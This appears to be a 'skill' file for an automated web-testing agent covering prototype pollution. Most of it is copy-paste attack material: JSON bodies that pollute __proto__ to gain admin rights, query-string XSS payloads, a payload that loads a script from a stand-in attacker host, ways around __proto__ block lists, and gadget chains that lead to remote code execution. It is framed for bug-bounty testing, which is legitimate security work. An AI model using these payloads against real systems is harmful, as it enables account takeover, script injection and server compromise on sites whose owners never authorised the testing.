# SKILL: Prototype Pollution (Server + Client)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (prototype pollution (server + client)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
JS object prototype mutation via untrusted merge / clone / lodash.set. Server-side: RCE / auth bypass. Client-side: XSS / DOM clobbering.

---

## DETECTION
Inject `__proto__[isAdmin]=true` or `constructor.prototype.foo=bar` and observe later property reads.

## EXPLOITATION
### Server-side (Node)
```http
POST /api/profile
{"name":"x","__proto__":{"isAdmin":true}}
POST /api/profile
{"name":"x","constructor":{"prototype":{"isAdmin":true}}}
```

### Client-side
```
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>
?__proto__.src=//attacker.tld/x.js
```

### Lodash chain
- `_.merge`, `_.set`, `_.defaultsDeep` are sinks. Detection: pollute `__proto__.toString` and look for crashes.

### Gadget chain (popular)
- jQuery `extend`, lodash `mergeWith`, Mongoose merge → chain to RCE via:
  - `child_process.spawn` env injection
  - require('module')._extensions or Module._cache pollution

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
Block list of `__proto__` → use `constructor.prototype`. Block list of both → use Object.prototype directly via `[\"constructor\"][\"prototype\"]`.

## CHAIN POTENTIAL
Pollute `isAdmin: true` → BFLA. Pollute `process.env.NODE_OPTIONS=--inspect` → RCE.

## TOOLS
PPScan, ppmap, ppfuzz

## COMMANDS
```bash
go run ppfuzz https://target/?param=value
node ppmap-detection.js https://target
```

## EDGE CASES / NOT-A-BUG TRAPS
Client-side PP often combines with template-literal HTML to chain to XSS.

## TRIAGE ANGLE (per platform)
Show end-to-end RCE or admin access.

## SEVERITY & CVSS
8.5–9.8.

## REFERENCES
Snyk PP research • PortSwigger PP labs • Mansoor Lerocha PP RCE chains
